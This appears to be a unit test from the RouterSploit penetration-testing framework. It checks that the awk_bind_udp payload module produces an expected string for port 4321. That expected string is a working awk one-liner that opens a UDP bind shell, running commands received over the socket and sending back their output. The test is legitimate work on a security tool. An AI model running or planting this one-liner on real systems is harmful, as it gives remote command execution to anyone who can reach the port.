from routersploit.modules.payloads.cmd.awk_bind_udp import Payload


# awk bind udp payload with rport=4321
bind_udp = (
    "awk 'BEGIN{s=\"/inet/udp/4321/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.rport = 4321

    assert payload.run() == bind_udp
